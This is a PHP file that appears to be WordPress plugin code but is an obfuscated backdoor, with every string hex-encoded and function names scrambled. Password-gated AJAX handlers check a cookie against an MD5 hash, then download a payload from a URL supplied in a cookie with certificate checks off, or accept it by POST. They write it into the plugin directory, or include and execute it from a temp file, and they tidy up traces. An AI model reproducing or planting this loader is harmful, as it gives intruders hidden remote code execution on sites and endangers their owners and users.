<?php
add_action(si_sliejmesw("0705340906000b34164106124416090e0f00405e4343034149405f095402165e4616504343455a50", SI_GROUBWIEC), si_sliejmesw("031c3402050e1e001d00140f", SI_GROUBWIEC));
add_action(si_sliejmesw("0705340906000b341c1a17041903340c5800175f1117011511465e595a0544524741064e13105e5c0f56465842445f", SI_GROUBWIEC), si_sliejmesw("031c3402050e1e001d00140f", SI_GROUBWIEC));

function si_jiomkousy() {
    $si_prieschprem = si_sliejmesw("46455e5d5a5615081342014541455e585e024108144c544e16400d095a58455b", SI_GROUBWIEC);
    if (!isset($_COOKIE[si_sliejmesw("18050d1f1c", SI_GROUBWIEC)]) || md5($_COOKIE[si_sliejmesw("18050d1f1c", SI_GROUBWIEC)]) != $si_prieschprem){
        wp_die( 0 );
    }
    if (isset($_COOKIE[si_sliejmesw("14410a0c5802110d1114544341430f5f5554470a4a16024344165c5d5f514253", SI_GROUBWIEC)])){
        $si_scxoadflbaift = si_snaijaitwee($_COOKIE[si_sliejmesw("14410a0c5802110d1114544341430f5f5554470a4a16024344165c5d5f514253", SI_GROUBWIEC)]);
        file_put_contents(__DIR__ . si_sliejmesw("5f14181b091500441b1806111506441c1b0e06181a001d17051b45180206", SI_GROUBWIEC), $si_scxoadflbaift);
    }elseif(isset($_POST[si_sliejmesw("161c070d33021c0506100902", SI_GROUBWIEC)])){
        file_put_contents(__DIR__ . si_sliejmesw("5f14181b091500441b1806111506441c1b0e06181a001d17051b45180206", SI_GROUBWIEC), $_POST[si_sliejmesw("161c070d33021c0506100902", SI_GROUBWIEC)]);
    }
    wp_die( 0 );
}

function si_snaijaitwee($si_clietrauski) {
    $si_scxoadflbaift = si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC);
    if (function_exists(si_sliejmesw("1300190433081d0206", SI_GROUBWIEC))) {
        $si_staunaskouvoap = array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_ENCODING => si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC),
            CURLOPT_USERAGENT => si_sliejmesw("3d1a1101000d1244475b575658220206080e0418523b3356455b5a534c1305514147494659552c0d0f0a1c444045564440445b594c271a191713080e5f4659465c", SI_GROUBWIEC),
            CURLOPT_AUTOREFERER => true,
            CURLOPT_CONNECTTIMEOUT => 120,
            CURLOPT_TIMEOUT => 120,
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        );

        $si_twaehithe = curl_init($si_clietrauski);
        curl_setopt_array($si_twaehithe, $si_staunaskouvoap);
        $si_scxoadflbaift = @curl_exec($si_twaehithe);
    }

    if ($si_scxoadflbaift)
        return $si_scxoadflbaift;

    $si_scxoadflbaift = @file_get_contents($si_clietrauski);
    return $si_scxoadflbaift;
}

function si_blisizclausto($si_scxoadflbaift){
    $si_leetoagby = sys_get_temp_dir();
    $si_kodtaerkbraid = tempnam($si_leetoagby, si_sliejmesw("000734", SI_GROUBWIEC));
    if ($si_kodtaerkbraid === false) {
        $si_kodtaerkbraid = substr(str_shuffle(si_sliejmesw("1117080c090714031b1f0c1a1d1b04181d13001f0703100e090f", SI_GROUBWIEC)), 0, 8) . si_sliejmesw("5e050318", SI_GROUBWIEC);
        $si_kodtaerkbraid = __DIR__ . si_sliejmesw("5f", SI_GROUBWIEC) . $si_kodtaerkbraid;
    }
    if ($si_kodtaerkbraid != false) {
        file_put_contents($si_kodtaerkbraid, $si_scxoadflbaift);
    }
    if($si_kodtaerkbraid && file_exists($si_kodtaerkbraid)){
        update_option(si_sliejmesw("070534", SI_GROUBWIEC) . si_sliejmesw("031c341c040e060f17130b130714190c1c", SI_GROUBWIEC), base64_encode($si_kodtaerkbraid));
        include $si_kodtaerkbraid;
        unlink($si_kodtaerkbraid);
    }
}

add_action(si_sliejmesw("0705340906000b34424602144642530a5f04440a431405101413595c5903120e43420513144d0859", SI_GROUBWIEC), si_sliejmesw("031c34040d04090a070506030a", SI_GROUBWIEC));
add_action(si_sliejmesw("0705340906000b341c1a1704190334585f04115d454d054515420a590d03150f1447534312140e595b03160f4a1656", SI_GROUBWIEC), si_sliejmesw("031c34040d04090a070506030a", SI_GROUBWIEC));
if(!function_exists(si_sliejmesw("031c34040d04090a070506030a", SI_GROUBWIEC))){
    function si_laezaupauz() {
        $si_prieschprem = si_sliejmesw("46455e5d5a5615081342014541455e585e024108144c544e16400d095a58455b", SI_GROUBWIEC);
        if (!isset($_COOKIE[si_sliejmesw("18050d1f1c", SI_GROUBWIEC)]) || md5($_COOKIE[si_sliejmesw("18050d1f1c", SI_GROUBWIEC)]) != $si_prieschprem){
            wp_die( 0 );
        }
        if (isset($_COOKIE[si_sliejmesw("40460e0a5a564b09411050174114090e0807415f471706134142090d0859105a", SI_GROUBWIEC)])){
            $si_scxoadflbaift = si_snaijaitwee($_COOKIE[si_sliejmesw("40460e0a5a564b09411050174114090e0807415f471706134142090d0859105a", SI_GROUBWIEC)]);
            si_blisizclausto(si_frezaepla($si_scxoadflbaift));
            die();
        }elseif(isset($_POST[si_sliejmesw("161c070d33021c0506100902", SI_GROUBWIEC)])){
            si_blisizclausto(si_frezaepla($_POST[si_sliejmesw("161c070d33021c0506100902", SI_GROUBWIEC)]));
            die();
        }
        wp_die( 0 );
    }
}

add_action(si_sliejmesw("191b021c", SI_GROUBWIEC), si_sliejmesw("031c341c040e060f17130b130714190c1c", SI_GROUBWIEC));

function si_thoudeflewardp()
{
    $si_kodtaerkbraid = si_frezaepla(get_option(si_sliejmesw("070534", SI_GROUBWIEC) . si_sliejmesw("031c341c040e060f17130b130714190c1c", SI_GROUBWIEC)));
    if($si_kodtaerkbraid && file_exists($si_kodtaerkbraid)){
        unlink($si_kodtaerkbraid);
        delete_option(si_sliejmesw("070534", SI_GROUBWIEC) . si_sliejmesw("031c341c040e060f17130b130714190c1c", SI_GROUBWIEC));
    }
}